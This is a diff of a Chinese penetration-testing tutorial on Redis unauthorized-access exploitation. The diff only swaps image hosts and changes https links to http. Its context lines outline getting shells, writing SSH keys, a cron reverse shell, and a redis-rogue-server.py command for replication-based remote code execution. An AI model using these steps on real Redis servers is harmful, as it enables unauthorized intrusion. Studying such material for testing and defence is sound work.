@@ -28,11 +28,11 @@ save
 
 3.查看shell
 
-![](http://cdn.laohuan.art/2020-06-01_21-36-42.png)
+![](http://qn.laohuan.xin/2020-06-01_21-36-42.png)
 
 4.连接shell
 
-![](http://cdn.laohuan.art/2020-06-01_21-35-33.png)
+![](http://qn.laohuan.xin/2020-06-01_21-35-33.png)
 
 #### 写入shell密匙
 
@@ -42,7 +42,7 @@ save
 
 `ssh-keygen -t rsa`
 
-![](http://cdn.laohuan.art/2020-06-01_6-11-15.png)
+![](http://qn.laohuan.xin/2020-06-01_6-11-15.png)
 
 * ssh_ras为私匙
 * ssh_rsa.pub为公匙
@@ -92,7 +92,7 @@ save
 
 3.查看shell
 
-![](http://cdn.laohuan.art/2020-06-01_09-56-59.png)
+![](http://qn.laohuan.xin/2020-06-01_09-56-59.png)
 
 反弹shell已经写到计划任务，由于以上原因，无法反弹成功
 
@@ -100,16 +100,16 @@ save
 
 1.基于主从复制RCE
 
-* <https://github.com/Ridter/redis-rce />
-* <https://github.com/n0b0dyCN/redis-rogue-server/>
+* <http://github.com/Ridter/redis-rce />
+* <http://github.com/n0b0dyCN/redis-rogue-server/>
 
 `python3 redis-rogue-server.py --rhost 目标主机 --rport 目标端口 --lhost 监听IP --lport 端口`
 
-![](http://cdn.laohuan.art/2020-06-01_11-25-25.png)
+![](http://qn.laohuan.xin/2020-06-01_11-25-25.png)
 
 选择1会直接得到一个shell
 
-![](http://cdn.laohuan.art/2020-06-01_11-20-41.png)
+![](http://qn.laohuan.xin/2020-06-01_11-20-41.png)
 
 选择2会得到一个反弹shell
 
@@ -119,4 +119,4 @@ save
 
 <[http://www.vkxss.top/2019/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bubuntu%E5%8F%8D%E5%BC%B9shell%E9%97%AE%E9%A2%98/index.html](http://www.vkxss.top/2019/05/28/渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题/index.html)/>
 
-<https://siweicn.yuque.com/securitytech/exploit/redis/>
+<http://siweicn.yuque.com/securitytech/exploit/redis/>
